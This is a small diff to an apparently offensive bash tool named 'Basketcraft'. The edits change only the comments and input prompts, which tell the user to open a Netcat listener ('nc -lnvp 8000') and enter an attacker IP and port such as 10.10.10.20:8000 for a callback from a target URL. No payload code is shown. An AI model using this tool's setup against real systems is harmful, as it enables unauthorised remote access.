@@ -5,7 +5,7 @@
 #while running this script make sure that you have Netcat opened with its associated port 
 #example nc -lnvp 8000
 #and on the attackersip remember to put your IP address plus the port number opened using Netcat
-#
+#example 10.10.10.20:8000
 #
 #
 #tool name: Basketcraft
@@ -19,7 +19,7 @@
 #!/bin/bash
 
 # Prompt the user for their IP address
-read -p "Enter your IP address (attackerip): " attackerip
+read -p "Enter your IP address (attackerip address and associated port): " attackerip
 
 # Prompt the user for the URL and basket name
 read -p "Enter the target URL and port number: " url
